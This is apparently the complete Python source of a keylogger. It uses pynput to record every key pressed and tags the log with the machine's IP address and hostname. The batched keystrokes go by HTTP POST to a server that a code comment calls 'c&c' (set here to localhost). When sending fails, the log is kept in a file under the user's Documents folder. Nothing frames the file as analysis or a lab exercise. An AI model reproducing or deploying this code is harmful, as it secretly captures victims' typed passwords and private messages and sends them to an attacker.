from pynput.keyboard import Listener
import os
import requests
import socket
import datetime

URL = 'http://localhost:8080/data'
DATA = {'data': '',
        'ip': socket.gethostbyname(socket.gethostname()),
        'name': socket.gethostname(),
        'timestamp': datetime.datetime.now()
        }
PATH = os.path.expanduser('~')+"\\Documents\\"+DATA['ip']+'.txt'
CHAR_COUNT = 0


def on_press(key):
    key = str(key).replace("'", '')
    global CHAR_COUNT
    CHAR_COUNT += 1

    if len(key) > 1:
        if key == 'Key.space':
            DATA['data'] += ' '
            # if char is > 1000 send request to c&c server,
            # if response isn't okay try again, and if response is still not okay create file on computer
            # (in future) different service for searching for those files and resending them back
            if CHAR_COUNT > 10:
                DATA['timestamp'] = datetime.datetime.now()
                r = requests.post(URL, data=DATA)
                if r.status_code == 200:
                    CHAR_COUNT = 0
                    DATA['data'] = ''
                else:
                    f = open(PATH, 'w')
                    f.write(DATA['data'])
                    f.close()

                    DATA['data'] = ''
        else:
            DATA['data'] += "["+key.replace("Key.", "")+"]"
    else:
        DATA['data'] += key


with Listener(on_press=on_press) as listener:
    listener.join()
